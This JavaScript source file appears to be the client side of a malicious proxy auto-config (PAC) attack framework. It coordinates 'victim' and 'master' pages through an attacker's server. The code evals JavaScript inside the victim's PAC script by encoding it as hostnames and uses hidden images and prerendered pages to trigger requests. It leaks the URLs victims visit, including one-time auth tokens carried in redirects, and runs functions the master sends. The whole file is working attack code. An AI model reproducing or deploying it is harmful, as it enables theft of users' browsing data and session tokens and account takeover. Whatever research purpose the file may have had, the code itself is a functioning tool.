/**
 * Create a connection to the malicious PAC webserver
 * This uses an HTML5 server-sent event stream to receive
 * events in real time from the server. 
 * 
 * The victim and master pages use this class to comminucate with each other via
 * the webserver. This class can also be used to control the PAC script.
 * 
 * @param {string} subscribeUrl - this should be '/subscribe' for victim pages 
 * or '/subscribe?master' to the master page
 */
function PACServer(subscribeUrl) {
    this.url = subscribeUrl;
    this.subscriptionId = null;
    this.pacSid = null;
    this.evalReqNo = Math.floor(Math.random()*1000);
    this.recentUrls = [];

    // callbacks
    this.regexCallbacks = [];
    this.channelCallbacks = {};

    var evtSrc = new EventSource(this.url);
    evtSrc.onmessage = this._onmessage.bind(this);
}

/**
 * Clear all callbacks, and clear blocks/leak regexs from
 * the PAC script. This will cause the PAC script to
 * resume leaking all URLs.
 */
PACServer.prototype.resetPacState = function() {
    this.evalInPac('blockRegexes=new Array()');
    this.evalInPac('leakRegexes=new Array()');
    this.regexCallbacks = [];
    this.channelCallbacks = {};
    this.recentUrls = [];
}

/**
 *  Tell PAC script to block URLs matching this regex
 */ 
PACServer.prototype.addBlockRegex = function(regex) {
    this.evalInPac('blockRegexes.push(/' + regex.source + '/)');
}

/** 
 * Tell PAC script to leak URLs matching this regex
 */ 
PACServer.prototype.addLeakRegex = function(regex) {
    this.evalInPac('leakRegexes.push(/' + regex.source + '/)');
}

/**
 * Perform a callback when we receive an event of type 'channel' from the server
 */
PACServer.prototype.addCallback = function(channel, callback) {
    if (!(channel in this.channelCallbacks))
        this.channelCallbacks[channel] = [];
    this.channelCallbacks[channel].push(callback)
}

/** 
 *  Perform a callback when a leaked URL matches the regex
 */
PACServer.prototype.addRegexCallback = function(regex, callback) {
    this.regexCallbacks.push([regex, callback]);
}

/**
 * Send a JSON structure from victim to master.
 *
 * @param {string} channel - Name of channel - master will use `addCallback` to
 * receive these messages
 * @param {object} msg - dictionary of data to be sent
 */ 
PACServer.prototype.publishMsg = function(channel, msg, to) {
    channel = escape(channel).replace(/\+/g, "%2b");
    msg = escape(JSON.stringify(msg)).replace(/\+/g, "%2b");
    if (typeof to != 'string') to = 'master';
    this.requestUrl("/publish?channel=" + channel + "&msg=" + msg + "&qid=" + this.subscriptionId + "&to=" + to);
}

/**
 * Send a JSON structure from master to victims
 * 
 * @param {string} channel - Name of channel - victims will use `addCallback` to
 * receive these messages
 * @param {object} dictionary of data to be sent
 */ 
PACServer.prototype.victimMsg = function(channel, msg) {
    this.publishMsg(channel, msg, 'victims');
}

/**
 * Eval some Javascript inside the PAC file.
 * @param {string} js - Script to execute
 */ 
PACServer.prototype.evalInPac = function(js) {
    console.log("evalInPac", js);
    js += ";//" + (this.evalReqNo++);
    var encoded = asciiToHostNames(js, evalSuffix);
    for (var i=0; i < encoded.length; i++) {
        this.requestUrl('http://'+encoded[i]);
    }
}

/** 
 * Load a URL using a hidden <img> - we can then leak 302 redirect from the PAC script
 * @param {string} url - URL to load
 */ 
PACServer.prototype.requestUrl = function(url) {
    console.log("requestUrl", url);
    new Image().src = url;
}

/**
 * Load a URL using <link rel=prerender>
 *
 * Chrome will only allow one prerendered page to be active at once, so calling
 * this a second time will destroy any previously loaded page
 */ 
PACServer.prototype.prerenderUrl = function (url) {
    console.log("prerenderUrl", url);
    var d = document.querySelector('link[rel=prerender]');
    if (d) { // 
        d.parentElement.removeChild(d);
    }
    if (url) {
        d = document.createElement('link');
        d.setAttribute('rel', 'prerender');
        d.setAttribute('href', url);
        document.head.appendChild(d);
    }
}

/**
 * Request a URL and register a regex leak and callback. This is useful for
 * requests that will cause a 302 redirect.
 * 
 * @param {string} url - URL to be requested
 * @param {RegExp} regex - Leak regex
 * @param {function} callback - will be called when a URL matching regex is leaked
 */
PACServer.prototype.addRequestHandler = function(url, regex, callback) {
    this.addLeakRegex(regex);
    this.addRegexCallback(regex, callback);
    this.requestUrl(url);
}

/**
 * Request a URL and register a regex block, leak and callback. This is useful for
 * requests that will cause a 302 redirect to a URL with a one-time auth token.
 * 
 * @param {string} url - URL to be requested
 * @param {RegExp} regex - Leak regex
 * @param {function} callback - will be called when a URL matching regex is leaked
 */
PACServer.prototype.addBlockRequestHandler = function(url, regex, callback) {
    this.addBlockRegex(regex);
    this.addLeakRegex(regex);
    this.addRegexCallback(regex, callback);
    this.requestUrl(url);
}


/** 
 * Fetch a URL on the server and return headers and content
 * 
 * @param {string} url - URL to fetch
 * @param {function} callback - function to call back with result
 * @param {object} params - (optional) dictionary of optional settings:
 *   @param {RegExp} regex - Only return body content matching this
 *   @param {Object} cookies - dictionary of cookies to send with the reqeuest
 */
PACServer.prototype.scrapeUrl = function() {
    var args = Array.prototype.slice.call(arguments);
    var url = args.shift();
    //Process arguments
    var callback = (typeof args[args.length-1] === 'function') ? args.pop() : null;
    var params = (args.length > 0) ? args.shift() : {};
    if (callback == null)
        return;

    var xhttp = new XMLHttpRequest();
    var pac = this;
    xhttp.onreadystatechange = function() {
        if (xhttp.readyState == 4 && xhttp.status == 200) {
            callback(pac, JSON.parse(xhttp.responseText));
        }
    };

    var querystring = "url=" + escape(url).replace(/\+/g, "%2b");
    for (var param in params) {
        if (params.hasOwnProperty(param)) {
            var value = params[param];
            if (value instanceof RegExp)
                value = value.source;
            else if (value instanceof Object)
                value = JSON.stringify(value);

        querystring += "&" + escape(param).replace(/\+/g, "%2b") + "=" + escape(value).replace(/\+/g, "%2b");
      }
    }
    xhttp.open("GET", "/util/requests?" + querystring, true);
    xhttp.send();
}

/**
 * Add a URL to the prerender queue. Chrome will only prerender a single page at
 * a time, so we have to process URLs sequentially. The next URL will be loaded
 * after `count` URLs matching the `regex` have been leaked or after a 10-second
 * timeout.
 * 
 * @param {string} url - URL to be prerendered
 * @param {RegExp} regex - Leak URLs matching this regex
 * @param {number} count - Stop the prerender after this number of URLs matching
 * the regex have been leaked
 * @param {function} callback - Call this function for every matching URL leaked
 */
PACServer.prototype.addRequestPrerenderHandler = function(url, regex, count, callback) {
    this.addLeakRegex(regex);
    this.addRegexCallback(regex, function(pac, url) {
        // Test the url to make sure it matches the current prerender to avoid race conditions.
        if (pac.prerender_regex.test(url)) {
            pac.prerender_count -= 1;
            if (pac.prerender_count == 0) {
                pac._renderNextPrerenderUrl();
            }
        }
        callback(pac, url);
    });

    if (typeof this.prerender_queue == 'undefined') {
        this.prerender_queue = new Array();
        this.prerender_url = null;
        this.prerender_timeout = null;
    }

    this.prerender_queue.push([url, count, regex]);
    // If the queue is not currently being processed, render the first url
    if (this.prerender_url == null) {
        this._renderNextPrerenderUrl();
    }
}

PACServer.prototype._renderNextPrerenderUrl  = function() {
    clearTimeout(this.prerender_timeout);

    if (this.prerender_queue.length > 0) {
        [this.prerender_url, this.prerender_count, this.prerender_regex] = this.prerender_queue.shift();
        pac = this;
        this.prerender_timeout = setTimeout(function() { pac._renderNextPrerenderUrl(); }, 10000); // Give the page 10 seconds to load
        this.prerenderUrl(this.prerender_url);
    }
    else {
      this.prerender_url = null;
    }
}

/**
 * Process events recieved from server
 */
PACServer.prototype._onmessage = function(e) {
    var data = JSON.parse(e.data);

    if (!('type' in data))
        return;

    if (data.type == 'url') { // receive a URL leaked from the PAC script
        this._handleUrl(data);
    } else if (data.type == 'eval') { // JS eval response from PAC script
        this._handleRet(data);
    } else if (data.type == 'sub_id') { // we get sent a UUID after subscribing to the EventSource Echannel
        console.log("Event subscription id: " + data.sub_id); 
        this.subscriptionId = data.sub_id;
        this._requestPacSid();
    } else if (data.type == 'do_request') { // server asked us to fetch a URL
        console.log("Server requested URL: " + data.url)
        this.requestUrl(data.url);
    } else if (data.type == 'do_prerender') { // server asked us to prerender a URL
        console.log("Server requested prerender URL: " + data.url)
        this.prerenderUrl(data.url);
    } else if (data.type == 'call') { // master requested we call a function
        var fn = JSON.parse(data.msg).fn;
        console.log("Calling function " + fn);
        var fn = eval(fn);
        fn = fn.bind(this);
        fn(this);
    } 

    if (data.type in this.channelCallbacks) {
        var channel = data.type;
        if (data.msg) {
            try {   
                data.msg = JSON.parse(data.msg);
            } catch (e) {}
        }
        for (var i=0; i < this.channelCallbacks[channel].length; i++) {
            this.channelCallbacks[channel][i](this, data);
        }
    }
}

PACServer.prototype._handleRet = function(data) {
    var retstr = data.data;
    if (retstr.length == 0) retstr = '[0-length reply]';
    console.log('eval reply', retstr)
    if (retstr.indexOf('sidrequest-') == 0)
        this._gotMyPacSid(data.pac_sid);
}

PACServer.prototype._handleUrl = function(data) {
    var url = data.data;

    // deal with Chrome's duplicate URL requests to PAC script
    if (this.recentUrls.indexOf(url) >= 0) return;
    this.recentUrls.push(url);
    if (this.recentUrls.length > 20) this.recentUrls.shift();

    for (var i=0; i < this.regexCallbacks.length; i++) {
        var regex = this.regexCallbacks[i][0];
        var result = url.match(regex);
        if (result) {
            var callback = this.regexCallbacks[i][1];
            callback(this, url, result);
            return;
        }
    }
}

/**
 * We want to know the session ID of the PAC script this browser is  using. So
 * send our subscription ID through the PAC script. The reply lets this script
 * and the server tie the subscription ID (UUID) and PAC session ID together
 */ 
PACServer.prototype._requestPacSid = function() {
    var sidRequest = 'sidrequest-' + this.subscriptionId;
    this.evalInPac("'" + sidRequest + "'");
}

PACServer.prototype._gotMyPacSid = function (sid) {
    if (!this.pacSid) {
        this.pacSid = sid;
        console.log("PAC session ID: " + sid);
    }
}
